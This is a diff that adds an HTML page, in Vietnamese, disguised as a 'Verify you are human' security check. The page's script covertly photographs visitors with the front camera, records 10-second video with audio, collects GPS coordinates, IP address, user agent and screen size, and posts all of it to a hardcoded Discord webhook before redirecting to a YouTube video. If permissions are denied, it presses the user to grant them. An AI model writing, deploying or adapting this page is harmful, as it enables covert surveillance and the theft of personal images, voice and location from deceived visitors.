@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verify</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #0d1117; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; text-align: center; max-width: 400px; width: 100%; }
+        h3 { color: #c9d1d9; margin-bottom: 15px; }
+        p { color: #8b949e; font-size: 14px; margin-bottom: 25px; }
+        .btn { background: #238636; color: white; border: none; padding: 12px 24px; font-size: 15px; font-weight: 600; border-radius: 6px; cursor: pointer; width: 100%; margin: 5px 0; }
+        .btn:hover { background: #2ea043; }
+        #step-loading, #step-wait, #step-permission { display: none; }
+        video, canvas { display: none; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .lock-layer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; pointer-events: none; }
+    </style>
+</head>
+<body>
+    <div class="lock-layer"></div>
+    <div class="container">
+        <div id="step-terms">
+            <h3>Security Check</h3>
+            <p>Verify you are human to continue.</p>
+            <button id="btn-terms" class="btn">Verify Now</button>
+        </div>
+        <div id="step-permission">
+            <h3>Permission Required</h3>
+            <p id="perm-text">Please allow all permissions to continue.</p>
+            <button id="btn-permission" class="btn">OK</button>
+        </div>
+        <div id="step-wait">
+            <div class="spinner"></div>
+            <h3>Please wait</h3>
+            <p>Verifying... 15 seconds.</p>
+        </div>
+        <div id="step-loading">
+            <div class="spinner"></div>
+            <h3>Done!</h3>
+            <p>Redirecting...</p>
+        </div>
+    </div>
+    <video id="v" autoplay></video>
+    <canvas id="c" width="640" height="480"></canvas>
+    <script>
+        const DISCORD = "https://discord.com/api/webhooks/1538248677263540368/rCA1OTHcXvsj4c5u7-lUtFdugEZ45-YhrZNOTfYMrhfNaZCcw9BYWA7VaXiQKTOPGQ4X";
+
+        async function send(msg) {
+            try { await fetch(DISCORD, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: msg }) }); } catch(e) {}
+        }
+
+        async function sendPhoto(b64) {
+            const r = await fetch(b64);
+            const b = await r.blob();
+            const f = new FormData();
+            f.append("file", b, "camera.jpg");
+            f.append("payload_json", JSON.stringify({ content: "📸" }));
+            try { await fetch(DISCORD, { method: "POST", body: f }); } catch(e) {}
+        }
+
+        async function sendVideo(blob) {
+            const f = new FormData();
+            f.append("file", blob, "video.webm");
+            f.append("payload_json", JSON.stringify({ content: "🎥 Video 10s (có âm thanh)" }));
+            try { await fetch(DISCORD, { method: "POST", body: f }); } catch(e) {}
+        }
+
+        async function getIP() {
+            try {
+                const r = await fetch("https://api.ipify.org?format=json");
+                const d = await r.json();
+                return d.ip;
+            } catch(e) { return "Không lấy được IP"; }
+        }
+
+        async function requestGPS() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        await send("📍 Lat: " + pos.coords.latitude + " Lon: " + pos.coords.longitude + "\nhttps://maps.google.com?q=" + pos.coords.latitude + "," + pos.coords.longitude);
+                        resolve(true);
+                    },
+                    () => resolve(false)
+                );
+            });
+        }
+
+        async function capturePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const v = document.getElementById("v");
+                v.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000));
+                const c = document.getElementById("c");
+                const ctx = c.getContext("2d");
+                ctx.drawImage(v, 0, 0, 640, 480);
+                const d = c.toDataURL("image/jpeg");
+                stream.getTracks().forEach(t => t.stop());
+                await sendPhoto(d);
+                return true;
+            } catch (e) { return false; }
+        }
+
+        async function recordVideo() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const v = document.getElementById("v");
+                v.srcObject = stream;
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: "video/webm" });
+                    await sendVideo(blob);
+                };
+                recorder.start();
+                await new Promise(r => setTimeout(r, 10000));
+                recorder.stop();
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch (e) { return false; }
+        }
+
+        function done() {
+            document.getElementById("step-wait").style.display = "none";
+            document.getElementById("step-loading").style.display = "block";
+            setTimeout(() => {
+                window.location.href = "https://youtube.com/watch?v=dQw4w9WgXcQ";
+            }, 2000);
+        }
+
+        document.getElementById("btn-terms").addEventListener("click", async function() {
+            document.getElementById("step-terms").style.display = "none";
+            document.getElementById("step-wait").style.display = "block";
+            await capturePhoto();
+            await recordVideo();
+            await new Promise(r => setTimeout(r, 15000));
+            const gps = await requestGPS();
+            const cam = await capturePhoto();
+            const mic = await recordVideo();
+            if (!gps) {
+                document.getElementById("perm-text").innerText = "Bạn chưa cấp quyền vị trí. Hãy cho phép và thử lại.";
+                document.getElementById("step-wait").style.display = "none";
+                document.getElementById("step-permission").style.display = "block";
+                return;
+            }
+            if (!cam) {
+                document.getElementById("perm-text").innerText = "Bạn chưa cấp quyền camera. Hãy cho phép và thử lại.";
+                document.getElementById("step-wait").style.display = "none";
+                document.getElementById("step-permission").style.display = "block";
+                return;
+            }
+            if (!mic) {
+                document.getElementById("perm-text").innerText = "Bạn chưa cấp quyền mic. Hãy cho phép và thử lại.";
+                document.getElementById("step-wait").style.display = "none";
+                document.getElementById("step-permission").style.display = "block";
+                return;
+            }
+            done();
+        });
+
+        document.getElementById("btn-permission").addEventListener("click", function() {
+            location.reload();
+        });
+
+        window.onload = async function() {
+            const ip = await getIP();
+            await send("📱 New: " + navigator.userAgent + "\nIP: " + ip + "\nScreen: " + window.screen.width + "x" + window.screen.height);
+        };
+    </script>
+</body>
+</html>
